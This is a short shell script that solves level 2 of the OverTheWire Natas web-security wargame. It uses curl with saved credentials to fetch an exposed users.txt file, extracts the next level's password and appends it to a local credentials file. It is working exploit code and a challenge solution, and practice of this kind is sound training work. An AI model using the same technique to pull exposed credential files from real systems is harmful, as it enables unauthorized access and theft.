#!/bin/sh

level="natas2"
url="http://$level.natas.labs.overthewire.org"
web_auth=$(grep ^$level credentials)

echo -n "[i] Target: $url\n"
next_password=$(curl -u $web_auth -sL $url/files/users.txt -vv 2>&1 | grep "natas3" | cut -d ":" -f 2)
echo -n "[+] Password for the next level: $next_password\n"
echo "natas3:$next_password" >> ./credentials
